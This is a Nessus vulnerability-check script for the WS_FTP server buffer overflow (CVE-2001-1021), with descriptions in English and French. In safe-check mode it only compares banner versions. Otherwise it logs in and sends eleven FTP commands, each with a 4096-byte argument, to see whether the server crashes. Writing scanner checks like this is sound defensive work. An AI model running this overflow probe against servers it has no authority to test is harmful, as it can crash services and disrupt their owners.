# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GPL
#

if(description)
{
 script_id(11094);
 script_version ("$Revision: 1.9 $");
 script_cve_id("CVE-2001-1021");
 name["english"] = "WS FTP overflows";
 
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to shut down the remote
FTP server by issuing a command followed by a too long argument.

An attacker may use this flow to prevent your site from 
sharing some resources with the rest of the world, or even
execute arbitrary code on your system.

Solution : upgrade to the latest version your FTP server.

Risk factor : High";


 desc["francais"] = "Il s'est avéré possible de tuer 
le serveur FTP distant en envoyant une commande 
suivie d'un argument trop long. 

Un pirate peut utiliser cette faille pour empêcher votre site de
partager des ressources avec le reste du monde, ou même exécuter
du code arbitraire sur votre système.

Solution : mettez à jour votre server FTP.

Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Attempts a buffer overflow on many commands";
 summary["francais"] = "Essaye un débordement sur diverses commandes";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 #family["english"] = "Gain root remotely";
 #family["francais"] = "Passer root à distance";
 family["english"] = "FTP";
 family["francais"] = "FTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "ftp_anonymous.nasl",
 		    "ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 
 exit(0);
}

#

include ("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port) port = 21;
if (! get_port_state(port)) exit(0);

if (safe_checks() || ! get_kb_item("ftp/login"))
{
  m = "According to its version number, your remote WS_FTP server
is vulnerable to a buffer overflow against any command.

An attacker may use this flow to prevent your site from 
sharing some resources with the rest of the world, or even
execute arbitrary code on your system.

** Nessus only check the version number in the server banner
** To really check the vulnerability, disable safe_checks

Solution : upgrade to the latest version your FTP server.

Risk factor : High";

  banner = get_ftp_banner(port:port);

  if (egrep(pattern:"WS_FTP Server 2\.0\.[0-2]", string: banner))
	security_hole(port: port, data: m);
  exit(0);
}

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if(!login) login = "ftp";
if (! password) password = "test@nessus.org";

soc = open_sock_tcp(port);
if(! soc) exit(0);
if(! ftp_authenticate(socket:soc, user:login, pass:password))
{
  ftp_close(socket: soc);
  exit(0);
}

cmd[0] = "DELE";
cmd[1] = "MDTM";
cmd[2] = "MLST";
cmd[3] = "MKD";
cmd[4] = "RMD";
cmd[5] = "RNFR";
cmd[6] = "RNTO";
cmd[7] = "SIZE";
cmd[8] = "STAT";
cmd[9] = "XMKD";
cmd[10] = "XRMD ";

pb=0;
for (i=0; i<11; i=i+1)
{
  s = string(cmd[i], " /", crap(4096), "\r\n");
  send(socket:soc, data:s);
  r = recv_line(socket:soc, length:1024);
  #if(!r) pb=pb+1;
  ftp_close(socket: soc);
 
  soc = open_sock_tcp(port);
  if (! soc) { security_hole(port); exit(0); }
  ftp_authenticate(socket:soc, user:login, pass:password);
}

ftp_close(socket: soc);

#if (pb) security_warning(port);	# => False positive?
